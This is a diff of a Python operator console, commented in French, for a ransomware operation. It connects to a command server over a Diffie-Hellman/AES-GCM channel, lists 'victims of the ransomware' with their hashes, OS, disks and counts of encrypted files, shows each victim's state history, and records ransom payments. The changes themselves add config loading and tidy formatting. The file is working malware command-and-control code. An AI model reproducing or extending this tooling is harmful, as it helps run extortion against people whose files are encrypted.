@@ -1,11 +1,27 @@
 from utile import network as net
 from utile import message as mess
 from utile import security as secu
+from utile import config as config
+
 # Connexion au serveur
-conn, gp = net.connect_to_serv()
+cfg_file_console = config.load_config('console_controle')
+# if not cfg_file_console:
+#     config.create_config('console_controle')
+#     console_controle = config.load_config('console_controle')
+#     config.set_config(console_controle, 1, 'IP', "localhost")
+#     config.set_config(console_controle, 1, 'PORT_CLES', "8380")
+#     config.save_config(console_controle, 'console_controle')
+
+# Reload car posait problème au démarrage sans CFG (crash)
+# cfg_file_console = config.load_config('console_controle')
+
+# Ouverture d'un serveur avec comme adresse, port et timeout des valeurs du fichier CFG
+conn, gp = net.connect_to_serv(adresse=cfg_file_console['IP'], port=int(cfg_file_console['PORT_CLES']))
+# Création d'une clé Diffie Hellman servant au chiffrement AES-GCM 256
 key = secu.Diffie_Hellman_exchange_key(conn, gp)
 
-#----------------------------------------------------------
+
+# ----------------------------------------------------------
 def choix_victime(liste_victime):
     # Demande du numéro de la victime
     nb_victime = len(liste_victime)
@@ -17,6 +33,7 @@ def choix_victime(liste_victime):
         num_victime = int(input(f"\nEntrez le numéro de la victime (entre 1 et {nb_victime}): "))
 
     return num_victime
+
 
 def choix_action():
     """Cette fonction, lorsqu'elle est appelée, affiche un menu et demande à l'utilisateur d'entrer le choix
@@ -35,6 +52,7 @@ def choix_action():
 
     return choix
 
+
 def afficher_liste_victime(data_victimes):
     print("\nLISTING DES VICTIMES DU RANSOMWARE")
     print("----------------------------------")
@@ -52,15 +70,15 @@ def afficher_liste_victime(data_victimes):
         else:
             form = "{0:5}{1:15}{2:12}{3:15}{4:11}-"
         # Variable qui contient le hash pour pouvoir le couper après
-        hash = value['HASH']
-        print(form.format(str(value['VICTIM']).zfill(4), hash[:14], value['OS'], value['DISKS'], value['STATE'],
+        hash_victim = value['HASH']
+        print(form.format(str(value['VICTIM']).zfill(4), hash_victim[:14], value['OS'], value['DISKS'], value['STATE'],
                           str(value['NB_FILES'])))
+
 
 def afficher_historique_victime(data_victimes):
     print("\nHISTORIQUE DES ETATS D'UNE VICTIME")
     print("___________________________________")
 
-    form = "{0:20} - {1:14} - {2:20}"
     for value in data_victimes:
         # Vérifie l'état pour savoir si ca affichera des fichiers "chiffrés", "déchiffrés" ou rien
         if value['STATE'] == 'PENDING':
@@ -70,6 +88,7 @@ def afficher_historique_victime(data_victimes):
         else:
             form = "{0:20} - {1:14}"
         print(form.format(str(value['TIMESTAMP']), str(value['STATE']), str(value['NB_FILES'])))
+
 
 def afficher_rancon_victime(data_victimes):
     # Demande le numéro de la victime pour qui la rançon a été payée
@@ -101,10 +120,11 @@ def afficher_rancon_victime(data_victimes):
                 else:
                     print(f"ERREUR : La victime {victime['VICTIM']} est en mode {victime['STATE']}!")
                     afficher_rancon_victime(data_victimes)
-#----------------------------------------------------------
+
+
+# ----------------------------------------------------------
 
 def main():
-
     # Variable qui s'occupera de vérifier si l'utilisateur à bien fait le choix 1 avant de pouvoir faire tous les autres
     ordre_choix = False
     # Affiche une première fois le menu et stocke le choix
@@ -191,6 +211,7 @@ def main():
     # Ferme la fenêtre lorsque le choix est 4
     print("Fermeture de la session.")
     exit()
+
 
 if __name__ == "__main__":
     main()
